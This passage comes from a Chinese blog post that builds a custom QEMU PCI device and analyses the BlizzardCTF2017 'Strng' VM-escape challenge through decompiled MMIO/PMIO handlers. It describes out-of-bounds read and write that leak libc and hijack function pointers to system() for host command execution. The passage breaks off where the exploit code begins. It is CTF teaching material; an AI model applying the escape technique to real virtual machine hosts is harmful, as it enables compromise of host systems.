class="keyword">if</span> (strng-&gt;addr &amp; <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        saddr = strng-&gt;addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">switch</span> (saddr) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            strng-&gt;srand(val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            strng-&gt;regs[saddr] = strng-&gt;rand();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            strng-&gt;regs[saddr] = strng-&gt;rand_r(&amp;strng-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            strng-&gt;regs[saddr] = val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps strng_pmio_ops = &#123;</span><br><span class="line">    .read = strng_pmio_read,</span><br><span class="line">    .write = strng_pmio_write,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="初始化函数"><a href="#初始化函数" class="headerlink" title="初始化函数"></a>初始化函数</h3><p>然后是<strong>设备实例的初始化函数</strong>，在 <code>PCIDeviceClass</code> 当中定义了一个名为 <code>realize</code> 的函数指针，当 PCI 设备被载入时便会调用这个函数指针指向的函数来初始化</p><p>这里我们也定义一个自己的初始化函数，不过我们需要做的工作其实基本上就只有初始化两个 <code>MemoryRegion</code>，<code>memory_region_init_io()</code> 会为这两个 <code>MemoryRegion</code> 进行初始化的工作，并设置函数表为我们指定的函数表，<code>pci_register_bar()</code> 则用来注册 BAR:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = DO_UPCAST(STRNGState, pdev, pdev);</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;mmio, OBJECT(strng), &amp;strng_mmio_ops, strng, <span class="string">&quot;strng-mmio&quot;</span>, STRNG_MMIO_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;strng-&gt;mmio);</span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;pmio, OBJECT(strng), &amp;strng_pmio_ops, strng, <span class="string">&quot;strng-pmio&quot;</span>, STRNG_PMIO_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;strng-&gt;pmio);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是 Class 与 Object（也就是 instance）的初始化函数，这里需要注意的是在 Class 的初始化函数中我们应当设置父类 <code>PCIDeviceClass</code> 的一系列基本属性（也就是 PCI 设备的基本属性）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_instance_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = STRNG(obj);</span><br><span class="line"></span><br><span class="line">    strng-&gt;srand = srand;</span><br><span class="line">    strng-&gt;rand = rand;</span><br><span class="line">    strng-&gt;rand_r = rand_r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_class_init</span><span class="params">(ObjectClass *class, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = pci_strng_realize;</span><br><span class="line">    k-&gt;vendor_id = PCI_VENDOR_ID_QEMU;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x11e9</span>;</span><br><span class="line">    k-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id = PCI_CLASS_OTHERS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><p>最最最后就是为我们的 PCI 设备类型注册 TypeInfo </p><p>有时候需要接口中增加PCI 的接口:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> TypeInfo strng_info = &#123;</span><br><span class="line">        .name          = <span class="string">&quot;strng&quot;</span>,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(STRNGState),</span><br><span class="line">        .instance_init = strng_instance_init,</span><br><span class="line">        .class_init    = strng_class_init,</span><br><span class="line"> <span class="comment">/*     .interfaces = (InterfaceInfo[]) &#123;</span></span><br><span class="line"><span class="comment">        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,</span></span><br><span class="line"><span class="comment">        &#123; &#125;,</span></span><br><span class="line"><span class="comment">    &#125;,   */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    type_register_static(&amp;strng_info);</span><br><span class="line">&#125;</span><br><span class="line">type_init(pci_strng_register_types)</span><br></pre></td></tr></table></figure><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>将编写好的源码放置于<code>hw/misc/a3dev.c</code>目录</p><p>在 meson 构建系统中加入我们新增的这个设备，在 <code>hw/misc/meson.build</code> 中加入如下语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">softmmu_ss.add(when: <span class="string">&#x27;CONFIG_PCI_STRNG&#x27;</span>, if_true: files(<span class="string">&#x27;strng.c&#x27;</span>))</span><br></pre></td></tr></table></figure><p>并在 <code>hw/misc/Kconfig</code> 中添加如下内容，这表示我们的设备会在 <code>CONFIG_PCI_DEVICES=y</code> 时编译：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config PCI_STRNG</span><br><span class="line">    <span class="type">bool</span></span><br><span class="line">    <span class="keyword">default</span> y <span class="keyword">if</span> PCI_DEVICES</span><br><span class="line">    depends on PCI</span><br></pre></td></tr></table></figure><p>之后编译 Qemu 并附加上 <code>-device strng</code> ，之后随便起一个 Linux 系统，此时使用 <code>lspci</code> 指令我们便能看到我们新添加的 pci 设备：</p><h1 id="QEMU逃逸"><a href="#QEMU逃逸" class="headerlink" title="QEMU逃逸"></a>QEMU逃逸</h1><p>QEMU 逃逸本质上和用户态的 Pwn 题没有太大区别，只不过呈现形式略有不同。题目本身通常以一个 QEMU 模拟设备的形式进行呈现，该设备通常会实现一些功能并提供用户可操纵的 MMIO/PMIO 接口。选手通常需要编写一个与这些接口进行交互的程序并传到远程主机上运行以完成利用（类似于内核 Pwn）。</p><p>几乎所有的 CTF QEMU Pwn 题都是自定义一个设备并定义相应的 MMIO/PMIO 操作。</p><h2 id="BlizzardCTF2017-Strng"><a href="#BlizzardCTF2017-Strng" class="headerlink" title="BlizzardCTF2017 - Strng"></a>BlizzardCTF2017 - Strng</h2><p>题目的源码之前分析过,但实际做题的时候是没给源码的</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在启动脚本中发现添加了一个自定义设备</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -device strng \</span><br><span class="line">    -hda my-disk.img \</span><br><span class="line">    -hdb my-seed.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,<span class="built_in">id</span>=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure><p>ida打开qemu文件,ida加载要有一会,加载符号那里记得选择确定,不然有很多符号会缺失</p><p>之后在字符串窗口搜索字符串strng</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000063E3D800000023C/home/rcvalle/qemu/hw/misc/strng.c</span><br><span class="line">.rodata:000000000063E3FB0000000BCstrng-mmio</span><br><span class="line">.rodata:000000000063E4060000000BCstrng-pmio</span><br><span class="line">.rodata:000000000063E41100000006Cstrng</span><br><span class="line">.rodata:000000000063E42000000014Cstrng_instance_init</span><br><span class="line">.rodata:000000000063E44000000011Cstrng_class_init</span><br></pre></td></tr></table></figure><p>结合这些信息,可以在函数栏搜索对应函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">pci_strng_realize</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  memory_region_init_io(a1 + <span class="number">2288</span>, a1, strng_mmio_ops, a1, <span class="string">&quot;strng-mmio&quot;</span>, <span class="number">256LL</span>);</span><br><span class="line">  pci_register_bar(a1, <span class="number">0LL</span>, <span class="number">0LL</span>, a1 + <span class="number">2288</span>);</span><br><span class="line">  memory_region_init_io(a1 + <span class="number">2544</span>, a1, strng_pmio_ops, a1, <span class="string">&quot;strng-pmio&quot;</span>, <span class="number">8LL</span>);</span><br><span class="line">  <span class="keyword">return</span> pci_register_bar(a1, <span class="number">1LL</span>, <span class="number">1LL</span>, a1 + <span class="number">2544</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现注册了mmio处理与pmio处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">strng_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; (addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">unsigned</span> <span class="type">int</span> *)opaque + (addr &gt;&gt; <span class="number">2</span>) + <span class="number">701</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>opaque</code> 参数其实就是设备加载时动态分配的 <code>PCIDevice</code> 类的一个自定义子类。</p><p>在 <code>(u32*)opaque[701]</code> 处存在一个 <code>unsigned int</code> 数组（这里我们称为 <code>opaque-&gt;buf</code>）</p><p>MMIO 的 read 主要是简单的读取 <code>opaque-&gt;buf[(addr &gt;&gt; 2)]</code> 上的 4 字节内容，看起来似乎可以存在一个越界读取，但是<strong>在 QEMU 内部会检查 MR 访问范围（addr）是否超过定义的内存范围，所以其实是没法进行越界读取的</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">strng_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  hwaddr v4; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> vala; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; (addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)opaque + <span class="number">702</span>) = (*((__int64 (__fastcall **)(<span class="type">void</span> *, hwaddr, <span class="type">uint64_t</span>))opaque + <span class="number">384</span>))(opaque, v4, val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)v4 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        vala = val;</span><br><span class="line">        v5 = (*((__int64 (__fastcall **)(<span class="type">char</span> *))opaque + <span class="number">385</span>))((<span class="type">char</span> *)opaque + <span class="number">2812</span>);</span><br><span class="line">        LODWORD(val) = vala;</span><br><span class="line">        *((_DWORD *)opaque + <span class="number">704</span>) = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      *((_DWORD *)opaque + (<span class="type">unsigned</span> <span class="type">int</span>)v4 + <span class="number">701</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      (*((<span class="type">void</span> (__fastcall **)(_QWORD))opaque + <span class="number">383</span>))((<span class="type">unsigned</span> <span class="type">int</span>)val);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>地址为 <code>0</code>：将 <code>(u64*)opaque[383]</code> 处数据作为函数指针进行调用，参数为传入的值</li><li>地址为 <code>1 &lt;&lt; 2</code>：将 <code>(u64*)opaque[384]</code> 处数据作为函数指针进行调用，并将结果写入 <code>opaque-&gt;buf[3]</code></li><li>地址为 <code>其他值 &lt;&lt; 2</code>：在 <code>opaque-&gt;buf[(addr&gt;&gt;2)]</code> 处写入传入的值</li><li>若地址为 <code>3 &lt;&lt; 2</code>，则会在此之前将 <code>(u64*)opaque[385]</code> 处数据作为函数指针进行调用，参数为 <code>&amp;((char*)opaque[2812])</code> ，并往 <code>opaque-&gt;buf[3]</code> 写入传入的值</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">strng_pmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = *((_DWORD *)opaque + <span class="number">700</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v4 &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">return</span> *((<span class="type">unsigned</span> <span class="type">int</span> *)opaque + (v4 &gt;&gt; <span class="number">2</span>) + <span class="number">701</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> *((<span class="type">unsigned</span> <span class="type">int</span> *)opaque + <span class="number">700</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PMIO 的 read 功能则是进行数据读取：</p><ul><li>若 <code>addr == 0</code> ，则返回 <code>(unsigned int *)opaque[700]</code> 的值。</li><li>若 <code>addr == 4</code> ，则获取 <code>(unsigned int *)opaque[700]</code> 的值 <code>v4</code>，若低 2 位为 0 则返回 <code>opaque-&gt;buf[(v4 &gt;&gt; 2)]</code> 上数据。</li></ul><p>若我们能够控制 <code>(unsigned int *)opaque[700]</code> 的值，则可以直接完成一个越界读。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">strng_pmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = *((_DWORD *)opaque + <span class="number">700</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v4 &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = v4 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (_DWORD)v5 == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            *((_DWORD *)opaque + <span class="number">702</span>) = (*((__int64 (__fastcall **)(<span class="type">void</span> *, __int64, <span class="type">uint64_t</span>))opaque + <span class="number">384</span>))(</span><br><span class="line">                                          opaque,</span><br><span class="line">                                          <span class="number">4LL</span>,</span><br><span class="line">                                          val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)v5 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (_DWORD)v5 == <span class="number">3</span> )</span><br><span class="line">              *((_DWORD *)opaque + <span class="number">704</span>) = (*((__int64 (__fastcall **)(<span class="type">char</span> *, __int64, <span class="type">uint64_t</span>))opaque + <span class="number">385</span>))(</span><br><span class="line">                                            (<span class="type">char</span> *)opaque + <span class="number">2812</span>,</span><br><span class="line">                                            <span class="number">4LL</span>,</span><br><span class="line">                                            val);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              *((_DWORD *)opaque + v5 + <span class="number">701</span>) = val;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            (*((<span class="type">void</span> (__fastcall **)(_QWORD))opaque + <span class="number">383</span>))((<span class="type">unsigned</span> <span class="type">int</span>)val);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)opaque + <span class="number">700</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PMIO 的 write 功能定义如下：</p><ul><li>若 <code>addr == 0</code>，则将传入的值写入 <code>(unsigned int *)opaque[700]</code> ，因此结合 PMIO read 我们便可以完成越界读。</li><li>若 <code>addr == 4</code>，则获取 <code>(unsigned int *)opaque[700]</code> 的值 <code>v4</code>，若低 2 位为 0 则取 <code>v5 = v4 &gt;&gt;2</code>：</li><li>若 <code>v5 == 1</code>，则调用 <code>(u64*)opaque[384]</code> 处函数指针，返回值写入 <code>opaque-&gt;buf[1]</code>，参数见代码</li><li>若 <code>v5 == 3</code>，则调用 <code>(u64*)opaque[385]</code> 处函数指针，返回值写入 <code>opaque-&gt;buf[3]</code>，参数见代码</li><li>若 <code>v5 != 0</code>，则将传入的值写入 <code>opaque-&gt;buf[v5]</code></li><li>若 <code>v5 == 1</code>，则调用 <code>(u64*)opaque[383]</code> 处函数指针，参数为我们传入的值</li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于 PMIO read 功能的读取地址由 <code>(unsigned int *)opaque[700]</code> 决定，而该值可以通过 PMIO write 写入 <code>addr == 0</code> 处进行修改</p><p>由于题目一开始便在 <code>opaque</code> 靠后的放置了一些<strong>libc指针</strong>，因此我们可以通过读取这些函数指针泄露 libc 基址。</p><p>同样地，当 <code>addr == 4</code> 时，PMIO write 会向指定地址 + 偏移处写入数据，而该偏移值为我们可控的 <code>(unsigned int *)opaque[700]</code>，因此我们可以非常方便地劫持 <code>opaque</code> 上的函数指针，而这些函数指针又可以通过 MMIO write 与 PMIO write 进行触发，因此不难想到的是我们可以通过劫持这些函数指针来完成控制流劫持。</p><p>当 <code>(unsigned int *)opaque[700] == 3</code> 时，调用函数指针会传入一个 <code>opaque</code> 上地址作为第一个参数，而该处数据同样是我们可控的，因此我们可以在该处先写入字符串后再劫持函数指针为 <code>system()</code> 后直接调用即可完成 Host 上的任意命令执行。</p><h3 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h3><p>QEMU pwn 题会提供给我们一个 local Linux 环境，通常都有着 root 权限（除了一些套娃题目会要求选手先完成提权），通常我们需要使用 C 编写 exp，将其进行静态编译后传输到远程运行。有的题目也会提供本地编译环境（例如本题），这样我们便只需要传输 exp 的源代码到远程再编译运行即可。</p><p>首先说一下与题目进行交互的方式。QEMU pwn 的漏洞通常出现在一个自定义 PCI 设备中，我们可以通过 <code>lspci</code> 命令查看现有的 PCI 设备，在每个设备开头都可以看到形如 <code>xx:yy.z</code> 的十六进制编号，这个格式其实是 <code>总线编号:设备编号.功能编号</code>，当我们使用 <code>lspci -v</code>查看 PCI 设备信息时，在总线编号前面的 4 位数字便是 PCI 域的编号。</p><p>通常我们可以看到一个未被识别的设备，这通常便是题目设备。这里我们可以看到 PMIO 地址为 <code>0xc050</code>，MMIO 地址（物理地址）为 <code>0xfebf1000</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">Physical Slot: 3</span><br><span class="line">Flags: fast devsel</span><br><span class="line">Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">I/O ports at c050 [size=8]</span><br></pre></td></tr></table></figure><p><strong>PMIO</strong></p><p>先通过 <code>iopl(3)</code> 获取交互权限，接下来直接使用 <code>in()</code> 与 <code>out()</code> 系函数即可读写端口，需要注意的是<strong>端口地址应与读写长度对齐</strong>（例如读写 4 字节则端口地址需要对齐到 4</p><p><strong>MMIO</strong></p><p>通过 <code>mmap()</code> 映射 sysfs 下的资源文件来完成内存访问。以本题为例，通过 <code>lspci</code> 命令获取到的编号为 <code>00:03.0</code>，那么我们便可以通过 <code>mmap()</code> 映射 <code>/sys/devices/pci0000:00/0000:00:03.0/resource0</code> 文件直接完成 MMIO。类似于 PMIO，MMIO 的读写地址同样需要对齐到读写长度。</p><p>同样的,其实也可以通过映射 <code>/sys/devices/pci0000:00/0000:00:03.0/resource1</code> 文件的形式来以内存读写的形式完成 PMIO。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>来自wiki</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 